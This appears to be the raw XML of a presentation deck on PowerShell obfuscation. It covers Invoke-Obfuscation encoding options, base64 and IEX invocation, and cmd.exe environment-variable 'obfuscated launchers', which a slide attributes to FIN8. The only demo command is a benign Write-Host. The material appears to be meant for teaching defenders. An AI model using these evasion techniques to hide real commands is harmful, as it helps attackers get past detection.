              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Convert command to string/expression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200" dirty="0" smtClean="0"/>
              <a:t>Apply string obfuscation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200" dirty="0" smtClean="0"/>
              <a:t>Invoke with IEX</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="22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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596931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4299" y="1338937"/>
            <a:ext cx="6743700" cy="4495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580025" y="5834737"/>
            <a:ext cx="8555394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/>
              <a:t>https://c49f4645ad8c0f6be3e5-5e973e642b7ddd26ea7d3cbb5e911900.ssl.cf1.rackcdn.com/Abyssinian-cat-string.jpg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4737135"/>
            <a:ext cx="6529039" cy="1097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50297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800" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Encoding</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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/>
              <a:t>Most popular options attackers use:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>EncodedCommand</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>[Convert]::FromBase64String</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Invoke-Obfuscation provides the following encoding options:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="accent1">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent1">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="800" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent1">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" sz="800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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596931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3190" y="3448808"/>
            <a:ext cx="7506086" cy="1917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56619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08008" y="1166421"/>
            <a:ext cx="4000500" cy="4000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800" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obfuscated Launchers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9870057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endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>You can push the command to the parent or grandparent process and        call each command within environment variables</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent1">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>cmd.exe /c "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" u="sng" dirty="0" smtClean="0"/>
              <a:t>set var1=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Write-Host SUCCESS -Fore Green</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent1">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>&amp;&amp;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean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US" sz="2400" u="sng" dirty="0" smtClean="0"/>
              <a:t>set var2=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent1">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>&amp;&amp;cmd.exe /c </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" u="sng" dirty="0" smtClean="0"/>
              <a:t>echo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400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2400" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>%var1% </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent1">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>^| </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>%var2%</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent1">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean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US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3350" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="3350" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" sz="3350" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent1">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>cmd.exe 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</a:rPr>
              <a:t>/c </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent1">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>"echo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Write-Host </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SUCCESS -Fore </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Green</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent1">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>|</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent1">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent1">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="accent1">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="accent1">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent1">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="800" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent1">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" sz="800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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673135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210" y="6090466"/>
            <a:ext cx="1930499" cy="596931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753199" y="5882855"/>
            <a:ext cx="53263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dirty="0"/>
              <a:t>http://www.battlegrip.com/wp-content/uploads/2011/07/halomarkv-420x420.jpg</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Up Arrow 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6809117" y="3552008"/>
            <a:ext cx="229882" cy="922226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Up Arrow 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8154249" y="3552008"/>
            <a:ext cx="229882" cy="922226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43809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800" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obfuscated Launchers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9870057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2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent1">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="accent1">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="accent1">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent1">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="800" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent1">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" sz="800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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673135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210" y="6090466"/>
            <a:ext cx="1930499" cy="596931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7975" y="1375455"/>
            <a:ext cx="5679859" cy="4624227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08008" y="1166421"/>
            <a:ext cx="4000500" cy="40005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753199" y="5698823"/>
            <a:ext cx="53263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dirty="0"/>
              <a:t>http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" smtClean="0"/>
              <a:t>nikiskinazarene.com/wp-content/uploads/2014/02/hellomynameis.png</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="r"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" smtClean="0"/>
              <a:t>http</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>://www.battlegrip.com/wp-content/uploads/2011/07/halomarkv-420x420.jpg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49997" y="2381841"/>
            <a:ext cx="312944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Trivia:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Which Threat Actor Recently Used This Technique (like, a LOT)?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0998801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800" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obfuscated Launchers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9870057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2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent1">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="accent1">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="accent1">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent1">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="800" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent1">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" sz="800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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673135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210" y="6090466"/>
            <a:ext cx="1930499" cy="596931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7975" y="1375455"/>
            <a:ext cx="5679859" cy="4624227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08008" y="1166421"/>
            <a:ext cx="4000500" cy="40005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753199" y="5698823"/>
            <a:ext cx="53263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dirty="0"/>
              <a:t>http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" smtClean="0"/>
              <a:t>nikiskinazarene.com/wp-content/uploads/2014/02/hellomynameis.png</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="r"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" smtClean="0"/>
              <a:t>http</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>://www.battlegrip.com/wp-content/uploads/2011/07/halomarkv-420x420.jpg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8595" y="1977622"/>
            <a:ext cx="1414441" cy="1347087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0347206" y="2729376"/>
            <a:ext cx="10466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latin typeface="MV Boli" panose="02000500030200090000" pitchFamily="2" charset="0"/>
                <a:cs typeface="MV Boli" panose="02000500030200090000" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>FIN8</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0">
              <a:latin typeface="MV Boli" panose="02000500030200090000" pitchFamily="2" charset="0"/>
              <a:cs typeface="MV Boli" panose="02000500030200090000" pitchFamily="2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849997" y="2381841"/>
            <a:ext cx="312944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Trivia:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Which Threat Actor Recently Used This Technique (like, a LOT)?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Up Arrow 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="9665407" y="2613824"/>
            <a:ext cx="231125" cy="752246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98574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800" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obfuscated Launchers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9870057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2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent1">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="accent1">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="accent1">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent1">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="800" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent1">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" sz="800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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673135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210" y="6090466"/>
            <a:ext cx="1930499" cy="596931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08008" y="1166421"/>
            <a:ext cx="4000500" cy="40005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753199" y="5698823"/>
            <a:ext cx="53263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dirty="0"/>
              <a:t>http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" smtClean="0"/>
              <a:t>nikiskinazarene.com/wp-content/uploads/2014/02/hellomynameis.png</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="r"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" smtClean="0"/>
              <a:t>http</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>://www.battlegrip.com/wp-content/uploads/2011/07/halomarkv-420x420.jpg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8595" y="1977622"/>
            <a:ext cx="1414441" cy="1347087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0347206" y="2729376"/>
            <a:ext cx="10466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latin typeface="MV Boli" panose="02000500030200090000" pitchFamily="2" charset="0"/>
                <a:cs typeface="MV Boli" panose="02000500030200090000" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>FIN8</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0">
              <a:latin typeface="MV Boli" panose="02000500030200090000" pitchFamily="2" charset="0"/>
              <a:cs typeface="MV Boli" panose="02000500030200090000" pitchFamily="2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8667" y="1342539"/>
            <a:ext cx="4892276" cy="4657143"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom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4057134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800" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obfuscated Launchers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9870057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2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent1">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="accent1">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="accent1">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent1">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="800" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent1">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" sz="800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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673135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210" y="6090466"/>
            <a:ext cx="1930499" cy="596931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08008" y="1166421"/>
            <a:ext cx="4000500" cy="40005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753199" y="5698823"/>
            <a:ext cx="53263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dirty="0"/>
              <a:t>http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" smtClean="0"/>
              <a:t>nikiskinazarene.com/wp-content/uploads/2014/02/hellomynameis.png</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="r"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" smtClean="0"/>
              <a:t>http</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>://www.battlegrip.com/wp-content/uploads/2011/07/halomarkv-420x420.jpg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8595" y="1977622"/>
            <a:ext cx="1414441" cy="1347087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0347206" y="2729376"/>
            <a:ext cx="10466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latin typeface="MV Boli" panose="02000500030200090000" pitchFamily="2" charset="0"/>
                <a:cs typeface="MV Boli" panose="02000500030200090000" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>FIN8</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0">
              <a:latin typeface="MV Boli" panose="02000500030200090000" pitchFamily="2" charset="0"/>
              <a:cs typeface="MV Boli" panose="02000500030200090000" pitchFamily="2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8667" y="1342539"/>
            <a:ext cx="4892276" cy="4657143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9653" y="1541124"/>
            <a:ext cx="5708434" cy="3641237"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:effectLst>
            <a:outerShdw blurRad="508000" dist="38100" dir="13500000" algn="b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0019698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800" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obfuscated Launchers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9870057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2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent1">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="accent1">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="accent1">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent1">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="800" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent1">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" sz="800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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673135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210" y="6090466"/>
            <a:ext cx="1930499" cy="596931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08008" y="1166421"/>
            <a:ext cx="4000500" cy="40005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753199" y="5698823"/>
            <a:ext cx="53263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dirty="0"/>
              <a:t>http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" smtClean="0"/>
              <a:t>nikiskinazarene.com/wp-content/uploads/2014/02/hellomynameis.png</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="r"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" smtClean="0"/>
              <a:t>http</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>://www.battlegrip.com/wp-content/uploads/2011/07/halomarkv-420x420.jpg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8595" y="1977622"/>
            <a:ext cx="1414441" cy="1347087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0347206" y="2729376"/>
            <a:ext cx="10466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latin typeface="MV Boli" panose="02000500030200090000" pitchFamily="2" charset="0"/>
                <a:cs typeface="MV Boli" panose="02000500030200090000" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>FIN8</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0">
              <a:latin typeface="MV Boli" panose="02000500030200090000" pitchFamily="2" charset="0"/>
              <a:cs typeface="MV Boli" panose="02000500030200090000" pitchFamily="2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8667" y="1342539"/>
            <a:ext cx="4892276" cy="4657143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9653" y="1541124"/>
